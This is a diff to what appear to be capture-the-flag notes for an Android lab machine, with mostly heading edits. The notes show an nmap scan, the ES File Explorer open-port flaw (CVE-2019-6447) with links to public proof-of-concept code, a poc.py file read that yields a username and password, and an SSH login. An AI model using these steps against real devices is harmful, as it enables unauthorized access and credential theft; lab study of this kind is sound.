@@ -8,7 +8,7 @@ IP: 10.10.10.247
 Curl/Python
 Andriod OS + tools
 
-### Enum
+### Enumeration
 nmap -p- -A -oN Exploreprts.txt ${IP}
 + 2222 SimplSSH
 + 5555 Andriod Debug bridge
@@ -16,25 +16,25 @@ nmap -p- -A -oN Exploreprts.txt ${IP}
 + 59777 Bukkit JSONAPI
 + 44233 fingerprint-strings
 
-### Search
+### Research
 Yields CVE-2019-6447
 + https://github.com/fs0c131y/ESFileExplorerOpenPortVuln
 + https://www.exploit-db.com/exploits/50070
 
-### Step 1: file extraction
+### Step 1: File Extraction
 + python3 poc.py ${cmd} ${IP} 
 + python3 poc.py ${cmd} ${IP} $dir/$.jpg
 + [+] Done. Saved as 'out.dat'.
 
-Now that you have downloaded the file, open the URL in a browser.
-+ ${IP}:59777/$dir/$.jpg
+After file downloaded, open 
++ ${IP}:59777/$dir/$.jpg || xdg-open out.dat
 + File gives UN && PW
 
 ### Step 2: SSH
 + ssh -p 2222 $UN@${IP} 
 + ${PW}
 
-### Info gathering
+### Information Gathering
 + :/whoami
 u0_a76
 + :/uname -a 
